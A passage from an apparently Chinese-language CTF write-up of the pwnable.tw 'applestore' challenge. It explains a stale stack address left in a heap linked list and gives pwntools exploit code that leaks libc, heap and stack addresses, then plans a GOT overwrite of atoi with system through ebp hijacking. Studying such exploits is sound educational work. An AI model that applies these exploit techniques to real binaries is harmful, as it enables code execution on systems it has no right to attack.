class="line"></span><br><span class="line">add = <span class="string">'2'</span>;delete=<span class="string">'3'</span>;cart=<span class="string">'4'</span>;checkout=<span class="string">'5'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>,num)</span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    action(add,<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    action(add,<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    action(add,<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    action(add,<span class="string">'4'</span>)</span><br><span class="line">action(checkout,<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行发现确实触发了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#39;20: iPad Air 2 - $499\n&#39;</span><br><span class="line">&#39;21: iPad Air 2 - $499\n&#39;</span><br><span class="line">&#39;22: iPad Air 2 - $499\n&#39;</span><br><span class="line">&#39;23: iPad Mini 3 - $399\n&#39;</span><br><span class="line">&#39;24: iPad Mini 3 - $399\n&#39;</span><br><span class="line">&#39;25: iPad Mini 3 - $399\n&#39;</span><br><span class="line">&#39;26: iPad Mini 3 - $399\n&#39;</span><br><span class="line">&#39;*: iPhone 8 - $1\n&#39;</span><br></pre></td></tr></table></figure><p>但是当我们再次与程序进行交互，执行选项4打印购物车列表时，发现出现崩溃了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">23: iPad Mini 3 - $399</span><br><span class="line">24: iPad Mini 3 - $399</span><br><span class="line">25: iPad Mini 3 - $399</span><br><span class="line">26: iPad Mini 3 - $399</span><br><span class="line">27: �T�\x0e- $-136445328</span><br><span class="line">[*] Process &#39;.&#x2F;applestore&#39; stopped with exit code -11 (SIGSEGV) (pid 25204)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p>这其实是因为，我们加入到链表中的栈地址的iphone8的数据已经失效了，这段栈空间被其他的函数所利用，所以是失效的数据，在执行cart的过程中，需要访问每一个节点的第一个元素所指向的地址，如果是错误的数据，很有可能这个地址处于不可访问的内存，导致程序崩溃。这也正是本题的漏洞所在</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="栈平衡与计算"><a href="#栈平衡与计算" class="headerlink" title="栈平衡与计算"></a>栈平衡与计算</h3><p>以往我们熟悉的栈操作都是在一个函数内，比如函数内的局部变量距离ebp的偏移，直接用IDA看就可以了。但是如果出了这个函数后，这个未清空的原来的变量的栈地址，被别的函数利用了，这里有三个问题：</p><ol><li>原来的变量距离现在的ebp的偏移是确定的么？</li><li>如果是，这个偏移和距离原来ebp的偏移是相同的么？</li><li>如果偏移不同，这个偏移怎么计算？</li></ol><p>这三个问题都需要确定程序当前所在的函数，而且真的想要好好回答这个问题，那么一切就要从栈帧说起</p><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>关于栈帧的界定有两种说法：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-2.png"  alt=""></p><ul><li>栈帧包括当前函数的参数，不包括所调用函数的参数</li><li>栈帧不包括当前函数的参数，包括所调用函数的参数</li></ul><p>第二种说法比较常见，参考：<a href="https://blog.csdn.net/zrf2112/article/details/95661316" target="_blank" rel="noopener">函数调用过程&amp;栈帧&amp;调用约定</a></p><p>从一个时刻的状态来看，的确第二种更合理。但是如果函数的调用过程来看，从被调函数回到了调用者函数后，被调函数的参数一定会被平衡，无论这个平衡是由被调函数还是调用者函数做的。所以当被调用函数完全消失时，当前栈的状态恢复成没有压被调函数的参数时的状态，然后调用者函数可能继续去调用其他函数。所以从这个角度来看，栈帧包括当前函数的参数是更加合理的。所以之后的讨论均采用第一种说法，即:</p><ul><li>栈帧包括当前函数的参数，不包括所调用函数的参数</li><li>esp指向栈顶，ebp指向栈低，但栈顶到栈低不是整个栈帧</li><li>并且以下讨论不包括调用alloca函数在栈上动态申请内存</li></ul><p>我们假设如下情景：无参数的func1，分别调用有一个参数的fun2，有一个参数的fun3，有两个参数的fun4，在调用过程中栈帧的变化如下，图中P标记的含义为一个参考地址，固定不动的一个地址：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-3.png"  alt=""></p><p>如果看明白了这个调用过程，便可以清晰的回答上面三个问题</p><h4 id="问题的答案"><a href="#问题的答案" class="headerlink" title="问题的答案"></a>问题的答案</h4><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-4.png"  alt=""></p><ol><li>无论在哪个函数中，原来的变量如func2 local var，在以上5种情况中，均距离当前的ebp的偏移是固定的，可计算的。</li><li>这个偏移和距离原来的ebp的偏移不一定相同，例如在第2，4，5，情况中不同，在3情况中相同。</li><li>可以根据函数调用关系以及函数参数所占用空间进行计算。例如fun3与fun2被fun1的调用关系一致，fun3与fun2均只有一个参数，且fun1在调用fun3和fun2之前没有进行奇怪的栈操作，则原来变量距离ebp的偏移和距离现在ebp的偏移相同。</li></ol><h4 id="本题的栈帧"><a href="#本题的栈帧" class="headerlink" title="本题的栈帧"></a>本题的栈帧</h4><p>可以看一下handler函数的汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.text:08048C31                 jmp     eax             ; switch jump</span><br><span class="line">.text:08048C33 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048C33</span><br><span class="line">.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5E↑j</span><br><span class="line">.text:08048C33                                         ; DATA XREF: .rodata:08049088↓o</span><br><span class="line">.text:08048C33                 call    list            ; jumptable 08048C31 case 1</span><br><span class="line">.text:08048C38                 jmp     short loc_8048C63</span><br><span class="line">.text:08048C3A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048C3A</span><br><span class="line">.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5E↑j</span><br><span class="line">.text:08048C3A                                         ; DATA XREF: .rodata:08049088↓o</span><br><span class="line">.text:08048C3A                 call    add             ; jumptable 08048C31 case 2</span><br><span class="line">.text:08048C3F                 jmp     short loc_8048C63</span><br><span class="line">.text:08048C41 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048C41</span><br><span class="line">.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5E↑j</span><br><span class="line">.text:08048C41                                         ; DATA XREF: .rodata:08049088↓o</span><br><span class="line">.text:08048C41                 call    delete          ; jumptable 08048C31 case 3</span><br><span class="line">.text:08048C46                 jmp     short loc_8048C63</span><br><span class="line">.text:08048C48 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048C48</span><br><span class="line">.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5E↑j</span><br><span class="line">.text:08048C48                                         ; DATA XREF: .rodata:08049088↓o</span><br><span class="line">.text:08048C48                 call    cart            ; jumptable 08048C31 case 4</span><br><span class="line">.text:08048C4D                 jmp     short loc_8048C63</span><br><span class="line">.text:08048C4F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048C4F</span><br><span class="line">.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5E↑j</span><br><span class="line">.text:08048C4F                                         ; DATA XREF: .rodata:08049088↓o</span><br><span class="line">.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5</span><br><span class="line">.text:08048C54                 jmp     short loc_8048C63</span><br><span class="line">.text:08048C56 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>故进入每一个函数时，handler的栈帧是相同的，且这几个函数均没有参数，所以进入这些函数后，ebp寄存器的值也全部相同，即如果进入一个函数中存在一个局部变量，则当进入其他函数时，这个局部变量当时的存在位置，距离现在函数的ebp的偏移均与原来相等。</p><h4 id="局部变量的生命周期"><a href="#局部变量的生命周期" class="headerlink" title="局部变量的生命周期"></a>局部变量的生命周期</h4><p>局部变量只在当前的函数内部，或者当前函数调用的子函数中可以使用。当前函数返回后，局部变量的生命周期结束，其所处的栈空间便成为垃圾数据，待之后的函数栈帧覆盖到这里时，一般来说会对栈上的值进行初始化。如果没有则可能存在未初始化数据的漏洞，不过此题不属于这种漏洞类型。因为此题的漏洞本质是将一个局部变量的地址，放到了堆上，堆是个全局的数据。于是发生了当局部变量的生命周期结束后，仍然被使用的情景，类似UAF。<strong>把栈的地址传出去了，这是个很危险的操作</strong></p><h4 id="垃圾栈数据导致崩溃与利用"><a href="#垃圾栈数据导致崩溃与利用" class="headerlink" title="垃圾栈数据导致崩溃与利用"></a>垃圾栈数据导致崩溃与利用</h4><p>刚才程序运行崩溃是因为，那个被记录到堆上的栈地址所对应的栈空间，在打印的过程中被其他函数所使用，例如printf等，其内容可以等同于垃圾，于是在按照程序的逻辑执行就可能会访问到非法的地址，进而程序崩溃。但是本题的这些函数，均可以通过输入控制这块栈空间。具体来说这个栈空间，即为checkout函数中ebp-0x20到ebp-0x10这段内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br></pre></td></tr></table></figure><p>通过了解本题的栈帧我们知道add,delete,cart,checkout，进入这四个函数后，ebp的值是相同的，并且可以将输入的字符串存储到自己的栈上，例如cart函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  _DWORD *i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;buf, <span class="number">0x15</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">121</span> )</span><br></pre></td></tr></table></figure><p>输入的buf被存储到栈上距离ebp偏移为-0x22字节，故只要跳过前两个字节，即可以控制那段checkout中的目标内存。而且允许输入的大小为0x15，长度完全够用，只要第一个字符为y，便可以进入打印逻辑。再例如delete函数中的输入逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  v2 = (_DWORD *)dword_804B070;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Item Number&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;nptr, <span class="number">0x15</span>u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br></pre></td></tr></table></figure><p>可见，delete和cart的输入偏移是一致的，均为ebp-22h，不过最后输入需要经过atoi转换成整型，才能进行正常的删除操作。所以这里可以用0x00截断的方式来填充前2个字节，也就是说我们只能控制个位编号的元素删除。有了如上的利用方式，我们就能伪造一个节点，进行打印或者删除操作。那我们利用打印或者删除能做什么呢？一般打印是信息泄露，删除是内存写。</p><h3 id="泄露libc基址和heap段地址"><a href="#泄露libc基址和heap段地址" class="headerlink" title="泄露libc基址和heap段地址"></a>泄露libc基址和heap段地址</h3><p>首先一般是信息泄露，本题我们可以首先泄露libc基址，以及堆段的地址。不过泄露有啥用呢？暂时看不出来。我们通过cart函数便可以打印双链表的一些数据，并且我们控制第27个节点，即栈上的内存。我们可以构造如下节点：</p><ul><li>前四个字节为漏洞程序的GOT表中一项的地址</li><li>再四个字节随意</li><li>再四个字节为&amp;myCart+2，即0x804B070</li><li>最后四个字节随意</li></ul><p>即：<code>payload = &#39;y\x00&#39;+p32(myelf.got[&#39;puts&#39;])+p32(1)+p32(0x0804B070)+p32()</code>，如图的stack节点，构造完之后的链表结构如下，bk回边未画出：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-5.png"  alt=""></p><p>构造如上节点后，cart函数在遍历打印的时候，遍历到第27个节点时，就会按照我们构造的数据去执行打印，并继续遍历，所以就会把<code>ELF.GOT[&#39;puts&#39;]</code>地址处的内容打印出来，在减去libc中puts函数的偏移就能泄露出来libc的基址。</p><p>在继续遍历的时候就会将<code>&amp;myCart + 2</code>的地址处识别为一个节点的开头，然后打印这个节点第一个元素所指向的内存，作为第28个节点的打印数据。这个指针本身是指向第一个节点，所以我们就会把第1个节点的数据打印出来直到遇到0x00。第1个节点的前四个字节是asprintf出来的堆块的地址，存储着iphone6这类的字符串。这个地址和堆空间其起始的地址偏移是固定的，所以我们也可以泄露出来堆段的地址。但是我们不知道偏移的具体大小，需要调试，这里我们需要使用本地的libc的信息，32位的一般位于<code>/lib/i386-linux-gnu/libc.so.6</code>：</p><blockquote><p>此处的libc.so.6是一个软链接，指向当前目录下的libc-2.23.so</p></blockquote><blockquote><p>有意思的是这里我的ubuntu16崩了，我导入快照发现/lib下并没有i386-linux-gnu，此时调用的是/lib32/libc-2.23.so，安装完pwndbg后i386-linux-gnu出现了，这时候查看发现调用的是/lib/i386-linux-gnu/libc-2.23.so</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./my_ubuntu32_libc.so"</span>)</span><br><span class="line">io = process(<span class="string">"applestore"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10103</span>)</span><br><span class="line"></span><br><span class="line">add = <span class="string">'2'</span>;delete=<span class="string">'3'</span>;cart=<span class="string">'4'</span>;checkout=<span class="string">'5'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>,num)</span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    action(add,<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    action(add,<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    action(add,<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    action(add,<span class="string">'4'</span>)</span><br><span class="line">action(checkout,<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'y\x00'</span>+p32(elf.got[<span class="string">'puts'</span>])+p32(<span class="number">1</span>)+p32(<span class="number">0x0804B070</span>)+p32(<span class="number">1</span>)</span><br><span class="line">action(cart,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">libc_addr = u32(io.recv(<span class="number">4</span>))-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">io.recvuntil(<span class="string">'28: '</span>)</span><br><span class="line">heap_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">log.warn(<span class="string">'libc_addr: 0x%x'</span> % libc_addr)</span><br><span class="line">log.warn(<span class="string">'heap_addr: 0x%x'</span> % heap_addr)</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">'b * 0x8048beb'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>打印地址如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[!] libc_addr: <span class="number">0xf7dda000</span></span><br><span class="line">[!] heap_addr: <span class="number">0x81cc490</span></span><br></pre></td></tr></table></figure><p>查看libc起始地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7dda000</span> <span class="number">0xf7f8a000</span> r-xp   <span class="number">1b</span>0000 <span class="number">0</span>      /lib/i386-linux-gnu/libc<span class="number">-2.23</span>.so</span><br></pre></td></tr></table></figure><p>查看堆块地址，可得堆基址为0x81cc000</p><blockquote><p>pwndbg前面现实的地址为堆块的起始地址，而非数据地址</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x81cc000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  <span class="built_in">size</span> = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x203a203e</span>, </span><br><span class="line">  bk = <span class="number">0x81cc490</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x202d20c7</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x80a3024</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可得我们泄漏出的地址0x81cc490比堆基址多出来了0x490的偏移，故袖子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">libc_addr = u32(io.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">io.recvuntil(<span class="string">'28: '</span>)</span><br><span class="line">heap_addr = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x490</span></span><br></pre></td></tr></table></figure><p>至于这个偏移为啥是固定的，应该是程序每次的堆操作都是固定的，所以偏移也是固定的。这个偏移中还存在着asprintf的堆操作，所以不同版本的libc可能偏移时不同的，但是同一个libc下应该是固定的。</p><h3 id="泄漏栈地址"><a href="#泄漏栈地址" class="headerlink" title="泄漏栈地址"></a>泄漏栈地址</h3><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">environ_libc = libc_addr + libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">payload = <span class="string">'ya'</span> + p32(environ_libc) + <span class="string">'a'</span>*<span class="number">0x4</span> + p32(<span class="number">0</span>)</span><br><span class="line">action(cart,payload)</span><br><span class="line">io.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">log.warn(<span class="string">'stack_addr: 0x%x'</span> % stack_addr)</span><br></pre></td></tr></table></figure><p>可得</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] stack_addr: <span class="number">0xffc4770c</span></span><br></pre></td></tr></table></figure><h3 id="delete一次有约束的地址写"><a href="#delete一次有约束的地址写" class="headerlink" title="delete一次有约束的地址写"></a>delete一次有约束的地址写</h3><p>虽然我们会获得一次写操作，可以将got表中atoi的地址覆盖成system的地址，但是之后会对libc中的system函数进行写操作，而代码段是只读的，程序会崩溃</p><p>假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p -&gt; fd -&gt; bk &#x3D; p -&gt; bk</span><br><span class="line">p -&gt; bk -&gt; fd &#x3D; p -&gt; fd</span><br></pre></td></tr></table></figure><p>加上这个节点本身的数据结构的条件，内存的变化即为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd[3]&#x3D;bk</span><br><span class="line">bk[2]&#x3D;fd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">为满足上面的约束条件可以有两种情况：</span><br><span class="line"></span><br><span class="line">(第一种)</span><br><span class="line">令: fd[3] &#x3D; * atoi@got , bk &#x3D; system@libc</span><br><span class="line">即: fd + 0xc &#x3D; atoi@got , bk &#x3D; system@libc</span><br><span class="line">即: fd &#x3D; atoi@got - 0xc , bk &#x3D; system@libc</span><br><span class="line">故: fd[3] &#x3D; bk , 即完成* atoi@got &#x3D; system@libc赋值操作</span><br><span class="line"></span><br><span class="line">但: bk[2] &#x3D; * (system@libc + 2)</span><br><span class="line">若: bk[2] &#x3D; fd , 进行赋值</span><br><span class="line">则: * (system@libc + 2) &#x3D; atoi@got - 0xc，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(第二种)</span><br><span class="line">令: bk[2] &#x3D; * atoi@got , fd &#x3D; system@libc</span><br><span class="line">即: bk + 0x8 &#x3D; atoi@got , fd &#x3D; system@libc</span><br><span class="line">即: bk &#x3D; atoi@got - 0x8 , fd &#x3D; system@libc</span><br><span class="line">故: bk[2] &#x3D; fd , 即完成* atoi@got &#x3D; system@libc赋值操作</span><br><span class="line"></span><br><span class="line">但: fd[3] &#x3D; * (system@libc + 3)</span><br><span class="line">若: fd[3] &#x3D; bk , 进行赋值</span><br><span class="line">则: * (system@libc + 3) &#x3D; atoi@got - 0x8，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃</span><br></pre></td></tr></table></figure><h3 id="劫持ebp并覆盖GOT表"><a href="#劫持ebp并覆盖GOT表" class="headerlink" title="劫持ebp并覆盖GOT表"></a>劫持ebp并覆盖GOT表</h3><p>我们可以通过对ebp进行劫持，从而使栈位于我们想要的地方，然后通过输入覆盖got表中的atoi函数为system</p><p>我们是通过delete函数满足约束条件的去写old_ebp，为GOT表的地址。首先想到GOT表位于可写的段，所以GOT表+2,+3的地址是data段，也是可写的，并不会崩溃，条件成立</p><p>那我们就需要通过调试算出偏移得到delete函数的ebp地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] stack_addr: 0xffbf4fdc</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-applestore-6.png"  alt=""></p><p>因为我们控制的是链表的bk，但是实际写入的地方是bk[2]，所以可得：</p><p>stack_addr - offset - 0x8 = delete_ebp_addr</p><p>offset = 0xffbf4fdc - 0xffbf4ed8 - 